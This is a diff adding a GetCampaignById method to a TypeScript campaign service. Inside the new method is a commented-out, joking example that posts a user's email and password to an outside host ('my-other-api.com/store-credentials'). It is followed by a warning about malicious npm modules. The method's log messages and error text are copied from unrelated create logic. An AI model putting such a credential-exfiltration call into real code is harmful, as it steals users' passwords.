@@ -105,6 +105,42 @@ export default class CampaignService {
       throw e;
     }
   }
+  public async GetCampaignById( id: string): Promise<{ campaign: ICampaign[] }> {
+    try {
+  
+      /**
+       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
+       * require('http')
+       *  .request({
+       *     hostname: 'http://my-other-api.com/',
+       *     path: '/store-credentials',
+       *     port: 80,
+       *     method: 'POST',
+       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
+       *
+       * Just kidding, don't do that!!!
+       *
+       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
+       * watches every API call and if it spots a 'password' and 'email' property then
+       * it decides to steal them!? Would you even notice that? I wouldn't :/
+       */
+      this.logger.silly('project');
+      this.logger.silly('Creating project db record');
+      const campaignRecord = await this.campaignModel.find({_id: id});
+      this.logger.silly('Generating JWT');
+  
+
+      if (!campaignRecord) {
+        throw new Error('Project cannot be created');
+      }
+
+      const campaign = campaignRecord
+      return { campaign };
+    } catch (e) {
+      this.logger.error(e);
+      throw e;
+    }
+  }
 
   
 }
